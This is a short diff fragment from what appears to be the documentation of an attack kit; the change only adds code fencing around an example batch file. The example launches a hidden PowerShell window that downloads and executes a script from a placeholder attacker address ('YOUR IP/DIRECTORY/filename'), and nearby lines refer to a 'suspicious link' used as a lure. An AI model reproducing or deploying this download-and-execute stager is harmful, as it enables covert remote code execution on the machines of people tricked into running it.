@@ -20,6 +20,8 @@ Both files saved to Downloads.
 If you edit RealJuicyWebLinks, the suspicious link may need to be updated as well back to the initial.
 
 # Example .cmd
+```batch
 @echo off
 
 powershell.exe -windowstyle hidden "(iwr https:// YOUR IP/DIRECTORY/filename -UseBasicParsing) | iex"
+```
